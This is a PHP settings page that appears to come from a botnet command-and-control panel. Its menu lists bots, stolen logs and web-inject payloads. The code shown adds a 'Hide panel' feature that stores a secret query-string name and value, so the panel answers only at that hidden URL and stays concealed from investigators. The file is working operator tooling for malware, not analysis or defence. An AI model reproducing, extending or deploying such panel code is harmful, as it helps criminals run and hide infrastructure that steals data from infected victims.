<?php
require_once('includes/config.php');
?>
<div class="panel">
    <div class="ui pointing menu">
      <a href="index.php?action=bots" class="item">Bots</a>
      <a href="index.php?action=panel" class="item">Logs</a>
      <a href="index.php?action=payload" class="item">Web Inject</a>
      <a href="index.php?action=listpayload" class="item">List Web Inject</a>
      <a href="index.php?action=settings" class="active item">Settings</a>
      <a href="logout.php" class="item">Logout</a>
      <div class="right menu">
        <a class="item">Welcome <?php echo $_SESSION['username']; ?></a>
      </div>
    </div>
    <div class="ui segment">
        <?php
        if(isset($_POST['hide'])){
            $get_name = $_POST['get_name'];
            $get_value = $_POST['get_value'];
            if($get_name != '' && $get_value != ''){
                $select_hide_status = $bdd->prepare("SELECT * FROM settings");
                $select_hide_status->execute();
                if($select_hide_status->rowCount() > 0){
                    $fetch = $select_hide_status->fetch();
                    if($fetch['hide_panel'] < 1){
                        $update = $bdd->prepare("UPDATE settings SET hide_panel = '1', get_name = :name, get_value = :value");
                        $update->bindParam(':name', $get_name);
                        $update->bindParam(':value', $get_value);
                        $update->execute();
                        echo '<div class="ui green message">access to panel with index.php?'.$get_name.'='.$get_value.'</div>';
                    }
                }
            }
            else{
                echo '<div class="ui red message">Error</div>';
            }
        }
        if(isset($_POST['disabled'])){
            $update = $bdd->prepare("UPDATE settings SET hide_panel = '0', get_name = '', get_value = ''");
            $update->execute();
            echo '<div class="ui green message">disabled</div>';
        }
        ?>
        <form class="ui form" action="#" method="post">
            <h4 class="ui dividing header">Hide panel</h4>
            <div class="field">
                <input type="text" name="get_name" placeholder="Get name" />
            </div>
            <div class="field">
                <input type="text" name="get_value" placeholder="Get value" />
            </div>
            <input type="submit" name="hide" class="ui button" value="active" />
            <input type="submit" name="disabled" class="ui button" value="disable" />
        </form>
    </div>
</div>